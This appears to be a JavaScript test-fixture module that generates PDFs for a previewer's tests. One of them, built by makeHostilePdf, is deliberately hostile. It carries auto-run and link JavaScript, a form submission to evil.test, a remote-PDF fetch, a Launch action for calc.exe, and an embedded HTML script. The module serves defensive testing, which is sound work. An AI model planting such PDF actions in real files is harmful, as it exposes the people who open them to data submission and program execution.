// Small PDFs made for tests (pdfPreview.test.js, PdfReader's browser check e2e/pdfreader.mjs):
// written out object by object, with a correct cross-reference table. Never imported by the app.

function serialise(objects, trailerExtra = '') {
  let out = '%PDF-1.7\n%âãÏÓ\n';
  const offsets = [];
  objects.forEach((body, i) => {
    offsets.push(out.length);
    out += `${i + 1} 0 obj\n${body}\nendobj\n`;
  });
  const xref = out.length;
  out += `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n`;
  for (const offset of offsets) out += `${String(offset).padStart(10, '0')} 00000 n \n`;
  out += `trailer\n<< /Size ${objects.length + 1} /Root 1 0 R ${trailerExtra}>>\nstartxref\n${xref}\n%%EOF\n`;
  return Uint8Array.from(out, (c) => c.charCodeAt(0) & 0xff);
}

const escapeText = (text) => text.replace(/[\\()]/g, (c) => `\\${c}`);

// A PDF of `pages` A4 pages, each saying "Page N" and the words in `lines` (the same on each),
// with an outline entry per page when `outline`. Objects: 1 catalog, 2 pages, 3 font, then
// each page and its content stream, then the outline.
export function makePdf({ pages = 3, lines = ['The quick brown fox jumps over the lazy dog.'], outline = false, extra = {} } = {}) {
  const objects = [];
  const pageIds = [];
  const first = 4;
  for (let i = 0; i < pages; i++) pageIds.push(first + i * 2);
  const outlineId = first + pages * 2;
  const catalogExtra = [outline ? `/Outlines ${outlineId} 0 R /PageMode /UseOutlines` : '', extra.catalog ?? ''].join(' ');
  objects.push(`<< /Type /Catalog /Pages 2 0 R ${catalogExtra} >>`);
  objects.push(`<< /Type /Pages /Kids [${pageIds.map((id) => `${id} 0 R`).join(' ')}] /Count ${pages} >>`);
  objects.push('<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>');
  for (let i = 0; i < pages; i++) {
    const text = [`Page ${i + 1}`, ...lines]
      .map((line, n) => `BT /F1 ${n === 0 ? 28 : 14} Tf 72 ${770 - n * 30} Td (${escapeText(line)}) Tj ET`)
      .join('\n');
    const annots = extra.annots?.(i) ?? '';
    objects.push(`<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /Font << /F1 3 0 R >> >> /Contents ${pageIds[i] + 1} 0 R ${annots} >>`);
    objects.push(`<< /Length ${text.length} >>\nstream\n${text}\nendstream`);
  }
  if (outline) {
    const itemIds = pageIds.map((_, i) => outlineId + 1 + i);
    objects.push(`<< /Type /Outlines /First ${itemIds[0]} 0 R /Last ${itemIds[itemIds.length - 1]} 0 R /Count ${pages} >>`);
    itemIds.forEach((id, i) => {
      const links = [i > 0 ? `/Prev ${id - 1} 0 R` : '', i < pages - 1 ? `/Next ${id + 1} 0 R` : ''].join(' ');
      objects.push(`<< /Title (Chapter ${i + 1}) /Parent ${outlineId} 0 R /Dest [${pageIds[i]} 0 R /XYZ 0 842 null] ${links} >>`);
    });
  }
  for (const body of extra.objects ?? []) objects.push(body);
  return serialise(objects, extra.trailer ?? '');
}

// A PDF that tries everything it shouldn't be able to: JavaScript when opened and on a link, a
// javascript: link, launching a program, opening another (remote) PDF, submitting a form to a
// server, a fillable field, an XFA form, and a file attached inside it. Page 1 has the links,
// each a 200×24 box down the left (from y 700 down), so a browser check can click them.
export function makeHostilePdf() {
  const pages = 2;
  const firstExtra = 4 + pages * 2; // after the catalog, pages, font and two pages
  const ids = {
    js: firstExtra,
    linkJs: firstExtra + 1,
    linkJsUri: firstExtra + 2,
    linkLaunch: firstExtra + 3,
    linkRemote: firstExtra + 4,
    linkSubmit: firstExtra + 5,
    field: firstExtra + 6,
    xfa: firstExtra + 7,
    attachment: firstExtra + 8,
    embedded: firstExtra + 9,
    linkWeb: firstExtra + 10,
  };
  const box = (n) => `/Rect [72 ${700 - n * 40} 272 ${724 - n * 40}]`;
  const page1Annots = [ids.linkJs, ids.linkJsUri, ids.linkLaunch, ids.linkRemote, ids.linkSubmit, ids.field, ids.attachment, ids.linkWeb];
  const objects = [
    // An OpenAction script.
    "<< /Type /Action /S /JavaScript /JS (app.alert\\('pdf script ran'\\); this.submitForm\\('https://evil.test/open'\\);) >>",
    `<< /Type /Annot /Subtype /Link ${box(0)} /Border [0 0 1] /A << /S /JavaScript /JS (app.launchURL\\('https://evil.test/js'\\);) >> >>`,
    `<< /Type /Annot /Subtype /Link ${box(1)} /Border [0 0 1] /A << /S /URI /URI (javascript:alert\\('uri'\\)) >> >>`,
    `<< /Type /Annot /Subtype /Link ${box(2)} /Border [0 0 1] /A << /S /Launch /F (calc.exe) >> >>`,
    `<< /Type /Annot /Subtype /Link ${box(3)} /Border [0 0 1] /A << /S /GoToR /F (https://evil.test/remote.pdf) /D [0 /Fit] >> >>`,
    `<< /Type /Annot /Subtype /Link ${box(4)} /Border [0 0 1] /A << /S /SubmitForm /F << /FS /URL /F (https://evil.test/submit) >> >> >>`,
    `<< /Type /Annot /Subtype /Widget /FT /Tx /T (name) /V (typed) ${box(5)} /F 4 /DA (/F1 12 Tf 0 g) /AA << /K << /S /JavaScript /JS (app.alert\\('keystroke'\\);) >> >> >>`,
    '<< /Length 60 >>\nstream\n<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/"><a>x</a></xdp:xdp>\nendstream',
    `<< /Type /Annot /Subtype /FileAttachment ${box(6)} /FS << /Type /Filespec /F (page.html) /EF << /F ${ids.embedded} 0 R >> >> /Contents (an attached file) >>`,
    '<< /Type /EmbeddedFile /Subtype /text#2Fhtml /Length 44 >>\nstream\n<script>alert("embedded file opened")</script>\nendstream',
    `<< /Type /Annot /Subtype /Link ${box(7)} /Border [0 0 1] /A << /S /URI /URI (https://example.com/fine) >> >>`,
  ];
  return makePdf({
    pages,
    lines: ['JS link', 'javascript: link', 'Launch', 'Remote PDF', 'Submit form', 'A field', 'Attached file', 'A web link'],
    extra: {
      catalog: `/OpenAction ${ids.js} 0 R /AcroForm << /Fields [${ids.field} 0 R] /XFA ${ids.xfa} 0 R /NeedAppearances true /DA (/F1 12 Tf 0 g) /DR << /Font << /F1 3 0 R >> >> >> /Names << /JavaScript << /Names [(boot) << /S /JavaScript /JS (app.alert\\('names script'\\);) >>] >> >>`,
      annots: (i) => (i === 0 ? `/Annots [${page1Annots.map((id) => `${id} 0 R`).join(' ')}]` : ''),
      objects,
    },
  });
}
